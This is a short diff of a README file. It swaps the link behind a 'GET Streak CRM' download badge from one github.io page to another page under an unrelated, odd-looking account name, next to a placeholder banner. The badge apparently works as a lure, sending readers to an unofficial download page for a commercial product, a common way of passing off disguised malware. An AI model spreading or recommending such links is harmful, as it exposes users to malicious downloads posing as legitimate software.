@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=9b82119ffa5e3a9de3054098bf0f92490fc5ed8a-4552311-images-thumbs&n=13)
 
-[![GET Streak CRM](https://img.shields.io/badge/GET%20%E2%80%94%20Streak%20CRM-0078D6?style=for-the-badge&logoColor=white)](https://tpm-health-diagnostic-tools.github.io/.github/streak-crm)
+[![GET Streak CRM](https://img.shields.io/badge/GET%20%E2%80%94%20Streak%20CRM-0078D6?style=for-the-badge&logoColor=white)](https://chasepersonzvvs.github.io/.github/streak-crm)
 
 ---
 
